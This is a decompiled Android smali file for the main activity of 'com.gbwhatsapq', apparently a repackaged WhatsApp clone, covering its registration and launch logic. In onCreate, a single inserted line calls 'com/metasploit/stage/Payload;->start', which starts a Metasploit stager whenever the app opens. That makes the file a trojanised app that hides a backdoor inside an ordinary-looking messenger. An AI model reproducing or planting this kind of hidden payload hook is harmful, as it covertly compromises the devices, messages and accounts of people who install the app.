.class public Lcom/gbwhatsapq/Main;
.super LX/0SW;
.source ""


# instance fields
.field public A00:Z

.field public A01:LX/0tn;

.field public final A02:LX/1E8;

.field public final A03:LX/0wt;

.field public final A04:LX/1Rq;

.field public final A05:LX/0yn;

.field public A06:Landroid/net/Uri;

.field public final A07:LX/1U3;

.field public final A08:Lcom/whatsapp/util/WhatsAppLibLoader;


# direct methods
.method public constructor <init>()V
    .locals 1

    invoke-direct {p0}, LX/0SW;-><init>()V

    invoke-static {}, LX/0yn;->A00()LX/0yn;

    move-result-object v0

    iput-object v0, p0, Lcom/gbwhatsapq/Main;->A05:LX/0yn;

    invoke-static {}, LX/27g;->A00()LX/1U3;

    move-result-object v0

    iput-object v0, p0, Lcom/gbwhatsapq/Main;->A07:LX/1U3;

    invoke-static {}, LX/0wt;->A00()LX/0wt;

    move-result-object v0

    iput-object v0, p0, Lcom/gbwhatsapq/Main;->A03:LX/0wt;

    sget-object v0, LX/1Rq;->A0K:LX/1Rq;

    iput-object v0, p0, Lcom/gbwhatsapq/Main;->A04:LX/1Rq;

    sget-object v0, Lcom/whatsapp/util/WhatsAppLibLoader;->INSTANCE:Lcom/whatsapp/util/WhatsAppLibLoader;

    iput-object v0, p0, Lcom/gbwhatsapq/Main;->A08:Lcom/whatsapp/util/WhatsAppLibLoader;

    invoke-static {}, LX/1E8;->A00()LX/1E8;

    move-result-object v0

    iput-object v0, p0, Lcom/gbwhatsapq/Main;->A02:LX/1E8;

    return-void
.end method


# virtual methods
.method public A0f()V
    .locals 6

    invoke-super {p0}, LX/0SW;->A0f()V

    iget-object v0, p0, LX/0SW;->A0A:LX/0tq;

    iget-object v0, v0, LX/0tq;->A00:Lcom/gbwhatsapq/Me;

    const/4 v1, 0x2

    if-nez v0, :cond_9

    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_3

    iget-object v0, p0, LX/0SW;->A0H:LX/1T4;

    invoke-virtual {v0}, LX/1T4;->A01()I

    move-result v5

    const/4 v4, 0x0

    const/4 v3, 0x1

    if-eqz v5, :cond_7

    if-eq v5, v3, :cond_0

    if-eq v5, v1, :cond_6

    const/4 v0, 0x4

    const-string v2, "changenumber"

    if-eq v5, v0, :cond_5

    const/4 v0, 0x5

    if-eq v5, v0, :cond_0

    const/4 v0, 0x6

    if-eq v5, v0, :cond_4

    const/4 v0, 0x7

    if-eq v5, v0, :cond_8

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v0, "main/invalid/registration state="

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v0, "; default to EULA"

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/whatsapp/util/Log;->e(Ljava/lang/String;)V

    :cond_0
    iget-object v0, p0, LX/0SW;->A0G:LX/1T3;

    invoke-virtual {v0, v4}, LX/1T3;->A0D(I)V

    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/gbwhatsapq/registration/EULA;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    :cond_1
    :goto_0
    invoke-virtual {p0}, Lcom/gbwhatsapq/Main;->A0n()Z

    move-result v0

    if-eqz v0, :cond_2

    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    :cond_2
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_3
    const-string v0, "main/me App.me is null, can\'t proceed."

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    return-void

    :cond_4
    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/gbwhatsapq/DeleteAccountConfirmation;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_0

    :cond_5
    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/gbwhatsapq/registration/VerifySms;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v0, p0, LX/0SW;->A0G:LX/1T3;

    invoke-virtual {v0}, LX/1T3;->A0K()Z

    move-result v0

    if-eqz v0, :cond_1

    goto :goto_1

    :cond_6
    const-string v0, "main/no-me/regname"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/gbwhatsapq/registration/RegisterName;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    goto :goto_0

    :cond_7
    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/gbwhatsapq/registration/EULA;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    const-string v2, "show_registration_first_dlg"

    invoke-virtual {v0, v2, v4}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_1

    goto :goto_1

    :cond_8
    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/gbwhatsapq/registration/VerifyTwoFactorAuth;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object v0, p0, LX/0SW;->A0G:LX/1T3;

    invoke-virtual {v0}, LX/1T3;->A0K()Z

    move-result v0

    if-eqz v0, :cond_1

    :goto_1
    invoke-virtual {v1, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    goto :goto_0

    :cond_9
    iget-object v0, p0, LX/0SW;->A0H:LX/1T4;

    invoke-virtual {v0}, LX/1T4;->A01()I

    move-result v0

    if-ne v0, v1, :cond_b

    const-string v0, "main/me/regname"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/gbwhatsapq/registration/RegisterName;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Lcom/gbwhatsapq/Main;->A0n()Z

    move-result v0

    if-eqz v0, :cond_a

    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    :cond_a
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void

    :cond_b
    iget-object v1, p0, LX/0SW;->A0G:LX/1T3;

    const/4 v0, 0x3

    invoke-virtual {v1, v0}, LX/1T3;->A0D(I)V

    const-string v0, "main/verified/setregverified"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    iget-object v0, p0, LX/0SW;->A06:LX/0t0;

    iget-boolean v0, v0, LX/0t0;->A0E:Z

    if-eqz v0, :cond_e

    iget-object v0, p0, Lcom/gbwhatsapq/Main;->A01:LX/0tn;

    if-eqz v0, :cond_d

    invoke-virtual {v0}, Landroid/os/AsyncTask;->getStatus()Landroid/os/AsyncTask$Status;

    move-result-object v1

    sget-object v0, Landroid/os/AsyncTask$Status;->RUNNING:Landroid/os/AsyncTask$Status;

    if-ne v1, v0, :cond_d

    const-string v0, "main/show dialog sync"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    iget-boolean v0, p0, Lcom/gbwhatsapq/Main;->A00:Z

    if-eqz v0, :cond_c

    const/16 v0, 0x68

    invoke-static {p0, v0}, LX/01a;->A1V(Landroid/app/Activity;I)V

    :cond_c
    return-void

    :cond_d
    new-instance v2, LX/0tn;

    invoke-direct {v2, p0}, LX/0tn;-><init>(Lcom/gbwhatsapq/Main;)V

    iput-object v2, p0, Lcom/gbwhatsapq/Main;->A01:LX/0tn;

    const/4 v0, 0x0

    new-array v1, v0, [Ljava/lang/Void;

    sget-object v0, LX/27g;->A02:Ljava/util/concurrent/ThreadPoolExecutor;

    invoke-virtual {v2, v0, v1}, Landroid/os/AsyncTask;->executeOnExecutor(Ljava/util/concurrent/Executor;[Ljava/lang/Object;)Landroid/os/AsyncTask;

    return-void

    :cond_e
    const-string v0, "main/messageStoreVerified/gotoActivity"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    const-string v0, "main/gotoActivity"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    invoke-virtual {p0}, Lcom/gbwhatsapq/Main;->A0m()V

    return-void
.end method

.method public final A0m()V
    .locals 8

    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_2

    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v2

    const/4 v3, 0x0

    if-eqz v2, :cond_0

    invoke-virtual {v2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v1

    const-string v0, "android.intent.action.MAIN"

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_0

    invoke-virtual {v2}, Landroid/content/Intent;->getFlags()I

    move-result v1

    const/high16 v0, 0x4000000

    and-int/2addr v1, v0

    if-eqz v1, :cond_0

    iget-object v0, p0, LX/2M4;->A0N:LX/19i;

    iget-object v0, v0, LX/19i;->A02:Landroid/content/SharedPreferences;

    const-string v4, "shortcut_version"

    invoke-interface {v0, v4, v3}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "main/recreate_shortcut"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    iget-object v0, p0, LX/2M4;->A0O:LX/1A7;

    invoke-static {v0}, LX/041;->A0Q(LX/1A7;)Ljava/lang/String;

    move-result-object v6

    new-instance v7, Landroid/content/Intent;

    invoke-direct {v7}, Landroid/content/Intent;-><init>()V

    const-string v1, "com.gbwhatsapq"

    const-string v0, "com.gbwhatsapq.Main"

    invoke-virtual {v7, v1, v0}, Landroid/content/Intent;->setClassName(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const/high16 v0, 0x10000000

    invoke-virtual {v7, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x4000000

    invoke-virtual {v7, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    new-instance v5, Landroid/content/Intent;

    invoke-direct {v5}, Landroid/content/Intent;-><init>()V

    :try_start_0
    const-string v2, "android.intent.extra.shortcut.INTENT"

    const/4 v1, 0x0

    invoke-virtual {v7, v1}, Landroid/content/Intent;->toUri(I)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v1}, Landroid/content/Intent;->parseUri(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v5, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    goto :goto_0
    :try_end_0
    .catch Ljava/net/URISyntaxException; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    move-exception v2

    const-string v0, "registername/remove-shortcut cannot parse shortcut uri "

    invoke-static {v0}, LX/0CS;->A0S(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v2}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v2}, Lcom/whatsapp/util/Log;->e(Ljava/lang/String;Ljava/lang/Throwable;)V

    :goto_0
    const-string v0, "android.intent.extra.shortcut.NAME"

    invoke-virtual {v5, v0, v6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    const-string v0, "com.android.launcher.action.UNINSTALL_SHORTCUT"

    invoke-virtual {v5, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    invoke-virtual {p0, v5}, Landroid/content/Context;->sendBroadcast(Landroid/content/Intent;)V

    iget-object v0, p0, LX/2M4;->A0O:LX/1A7;

    invoke-static {v0}, LX/041;->A0Q(LX/1A7;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/gbwhatsapq/registration/RegisterName;->A01(Landroid/content/Context;Ljava/lang/String;)V

    iget-object v1, p0, LX/2M4;->A0N:LX/19i;

    const/4 v0, 0x1

    invoke-static {v1, v4, v0}, LX/0CS;->A0h(LX/19i;Ljava/lang/String;I)V

    :cond_0
    invoke-virtual {p0}, Lcom/gbwhatsapq/Main;->A0n()Z

    move-result v0

    if-eqz v0, :cond_1

    new-instance v1, Landroid/content/Intent;

    invoke-static {}, Lcom/gbwhatsapq/yo/yo;->a()Ljava/lang/Class;

    move-result-object v0

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    invoke-virtual {p0, v3, v3}, Landroid/app/Activity;->overridePendingTransition(II)V

    :cond_1
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_2
    return-void
.end method

.method public final A0n()Z
    .locals 2

    iget-boolean v0, p0, Lcom/gbwhatsapq/Main;->A00:Z

    if-eqz v0, :cond_0

    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v1

    const/4 v0, 0x1

    if-eqz v1, :cond_1

    :cond_0
    const/4 v0, 0x0

    :cond_1
    return v0
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 6

    const-string v5, "show_registration_first_dlg"

    const-string v0, "Main/onCreate"

    invoke-static {v0}, LX/00N;->A02(Ljava/lang/String;)V

    :try_start_0
    iget-object v1, p0, Lcom/gbwhatsapq/Main;->A04:LX/1Rq;

    const-string v0, "Main"

    invoke-virtual {v1, v0}, LX/1Rq;->A04(Ljava/lang/String;)V

    const/4 v3, 0x0

    const/4 v0, 0x0

    iput-boolean v0, p0, LX/1cz;->A0A:Z

    invoke-super {p0, p1}, LX/0SW;->onCreate(Landroid/os/Bundle;)V

    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V

    iget-object v1, p0, LX/2M4;->A0O:LX/1A7;

    const v0, 0x7f110585

    invoke-virtual {v1, v0}, LX/1A7;->A06(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/app/Activity;->setTitle(Ljava/lang/CharSequence;)V

    iget-object v1, p0, Lcom/gbwhatsapq/Main;->A08:Lcom/whatsapp/util/WhatsAppLibLoader;

    const/4 v0, 0x0

    invoke-virtual {v1, v0}, Lcom/whatsapp/util/WhatsAppLibLoader;->load(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    const-string v0, "aborting due to native libraries missing"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    :goto_0
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    goto/16 :goto_4

    :cond_0
    iget-object v0, p0, Lcom/gbwhatsapq/Main;->A03:LX/0wt;

    invoke-virtual {v0}, LX/0wt;->A04()Z

    move-result v0

    if-eqz v0, :cond_1

    const-string v0, "main/device-not-supported"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->w(Ljava/lang/String;)V

    new-instance v0, Lcom/gbwhatsapq/DisplayExceptionDialogFactory$UnsupportedDeviceDialogFragment;

    invoke-direct {v0}, Lcom/gbwhatsapq/DisplayExceptionDialogFactory$UnsupportedDeviceDialogFragment;-><init>()V

    invoke-virtual {p0, v0}, LX/2M4;->AJV(Landroidx/fragment/app/DialogFragment;)V

    goto/16 :goto_4

    :cond_1
    iget-object v0, p0, LX/0SW;->A0H:LX/1T4;

    invoke-virtual {v0}, LX/1T4;->A01()I

    move-result v4

    iget-object v0, p0, LX/0SW;->A0A:LX/0tq;

    iget-object v1, v0, LX/0tq;->A00:Lcom/gbwhatsapq/Me;

    const/4 v2, 0x1

    if-nez v1, :cond_2

    if-nez v4, :cond_2

    goto :goto_1

    :cond_2
    const/4 v0, 0x6

    if-ne v4, v0, :cond_4

    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_8

    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/gbwhatsapq/DeleteAccountConfirmation;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    goto :goto_0

    :goto_1
    invoke-virtual {p0}, Landroid/app/Activity;->isFinishing()Z

    move-result v0

    if-nez v0, :cond_8

    new-instance v1, Landroid/content/Intent;

    const-class v0, Lcom/gbwhatsapq/registration/EULA;

    invoke-direct {v1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0, v5, v3}, Landroid/content/Intent;->getBooleanExtra(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_3

    invoke-virtual {v1, v5, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    :cond_3
    invoke-virtual {p0, v1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V

    invoke-static {p0}, LX/1Xm;->A0B(Landroid/app/Activity;)V

    goto :goto_4

    :cond_4
    if-eqz v1, :cond_5

    iget-object v0, p0, Lcom/gbwhatsapq/Main;->A02:LX/1E8;

    iget-boolean v0, v0, LX/1E8;->A03:Z

    if-nez v0, :cond_5

    invoke-virtual {p0}, LX/0SW;->A0l()Z

    move-result v0

    if-eqz v0, :cond_7

    iget-object v0, p0, LX/0SW;->A0D:LX/1Dz;

    invoke-virtual {v0}, LX/1Dz;->A06()I

    move-result v2

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "main/create/backupfilesfound "

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    if-lez v2, :cond_6

    const/16 v0, 0x69

    invoke-static {p0, v0}, LX/01a;->A1V(Landroid/app/Activity;I)V

    goto :goto_2

    :cond_5
    iput-boolean v2, p0, Lcom/gbwhatsapq/Main;->A00:Z

    invoke-virtual {p0}, LX/0SW;->A0f()V

    goto :goto_3

    :cond_6
    invoke-virtual {p0, v3}, LX/0SW;->A0j(Z)V

    :cond_7
    :goto_2
    const/4 v0, 0x1

    iput-boolean v0, p0, LX/1cz;->A0A:Z

    invoke-virtual {p0}, LX/1cz;->A0c()V

    :goto_3
    iget-object v1, p0, Lcom/gbwhatsapq/Main;->A04:LX/1Rq;

    const-string v0, "Main created"

    invoke-virtual {v1, v0}, LX/1Rq;->A05(Ljava/lang/String;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :cond_8
    :goto_4
    invoke-static {}, LX/00N;->A0E()V

    return-void

    :catchall_0
    move-exception v0

    invoke-static {}, LX/00N;->A0E()V

    throw v0
.end method

.method public onCreateDialog(I)Landroid/app/Dialog;
    .locals 3

    if-eqz p1, :cond_0

    invoke-super {p0, p1}, LX/0SW;->onCreateDialog(I)Landroid/app/Dialog;

    move-result-object v0

    return-object v0

    :cond_0
    const-string v0, "main/dialog/upgrade"

    invoke-static {v0}, Lcom/whatsapp/util/Log;->i(Ljava/lang/String;)V

    iget-object v0, p0, Lcom/gbwhatsapq/Main;->A04:LX/1Rq;

    invoke-virtual {v0}, LX/1Rq;->A00()V

    new-instance v2, LX/01P;

    invoke-direct {v2, p0}, LX/01P;-><init>(Landroid/content/Context;)V

    iget-object v1, p0, LX/2M4;->A0O:LX/1A7;

    const v0, 0x7f110c5c

    invoke-virtual {v1, v0}, LX/1A7;->A06(I)Ljava/lang/String;

    move-result-object v1

    iget-object v0, v2, LX/01P;->A00:LX/01K;

    iput-object v1, v0, LX/01K;->A0W:Ljava/lang/CharSequence;

    iget-object v1, p0, LX/2M4;->A0O:LX/1A7;

    const v0, 0x7f110c5b

    invoke-virtual {v1, v0}, LX/1A7;->A06(I)Ljava/lang/String;

    move-result-object v0

    iget-object v1, v2, LX/01P;->A00:LX/01K;

    iput-object v0, v1, LX/01K;->A0G:Ljava/lang/CharSequence;

    const/4 v0, 0x0

    iput-boolean v0, v1, LX/01K;->A01:Z

    iget-object v1, p0, LX/2M4;->A0O:LX/1A7;

    const v0, 0x7f110d76

    invoke-virtual {v1, v0}, LX/1A7;->A06(I)Ljava/lang/String;

    move-result-object v1

    new-instance v0, LX/0fc;

    invoke-direct {v0, p0}, LX/0fc;-><init>(Lcom/gbwhatsapq/Main;)V

    invoke-virtual {v2, v1, v0}, LX/01P;->A02(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)LX/01P;

    iget-object v1, p0, LX/2M4;->A0O:LX/1A7;

    const v0, 0x7f110584

    invoke-virtual {v1, v0}, LX/1A7;->A06(I)Ljava/lang/String;

    move-result-object v1

    new-instance v0, LX/0fb;

    invoke-direct {v0, p0}, LX/0fb;-><init>(Lcom/gbwhatsapq/Main;)V

    invoke-virtual {v2, v1, v0}, LX/01P;->A00(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)LX/01P;

    invoke-virtual {v2}, LX/01P;->A03()LX/281;

    move-result-object v0

    return-object v0
.end method

.method public onStart()V
    .locals 1

    invoke-super {p0}, LX/1cz;->onStart()V

    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/gbwhatsapq/Main;->A00:Z

    return-void
.end method

.method public onStop()V
    .locals 1

    invoke-super {p0}, LX/2J4;->onStop()V

    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/gbwhatsapq/Main;->A00:Z

    return-void
.end method
